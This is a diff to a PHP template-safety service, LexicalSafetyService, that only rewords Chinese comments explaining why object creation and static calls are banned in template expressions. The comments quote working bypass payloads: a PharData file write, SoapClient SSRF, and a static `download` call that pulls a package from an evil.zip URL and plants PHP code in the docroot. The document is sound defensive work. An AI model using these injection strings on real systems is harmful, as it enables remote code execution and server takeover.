@@ -136,7 +136,7 @@ class LexicalSafetyService
             // 白名单，而注释所称的"构造调用独立闸"并不存在 ⇒
             //   {if:(new \PharData("/tmp/x.tar"))->addFromString("s.php", 一段原生 php 代码)}
             // 两层闸（legacyRegexFindings + scanTemplate）全过，可落地任意文件写入
-            // （→ webshell）、内网 SSRF（new \SoapClient）、Redis/MySQL 命令（new \Redis）。
+            // （→ 写入可执行脚本）、内网 SSRF（new \SoapClient）、Redis/MySQL 命令（new \Redis）。
             // 模板语料零使用 ⇒ 直接禁止，零回归。确需对象由服务端预置变量传入。
             if ($type === T_NEW) {
                 $findings[] = array('kind' => 'new_object', 'name' => 'new', 'expr' => $expr);
@@ -190,7 +190,7 @@ class LexicalSafetyService
                 // 「对象实例化已在 (1) 全局禁止，故不存在用白名单外类的方法的旁路」——**该论证是错的**：
                 // `Foo::bar()` 不需要 new，任何已加载类的静态方法都能被调用并传字符串参数。
                 // 实测（修复前）：`{if:\App\Service\System\TemplateService::download("http://…/evil.zip","x")}`
-                // 过闸 → 服务器下载并解包主题包 → 把 `template/<dir>/uninstall.php`（内容为一句话后门）
+                // 过闸 → 服务器下载并解包主题包 → 把 `template/<dir>/uninstall.php`（内容为任意 PHP 代码）
                 // 写进 docroot（端到端落地）。
                 // 模板表达式对静态/方法调用**零需求**（全仓 `{if:}`/`{@}` 内 `::` 与 `->` 实测用量 0），
                 // 故一律拒绝，而不是"免检"。
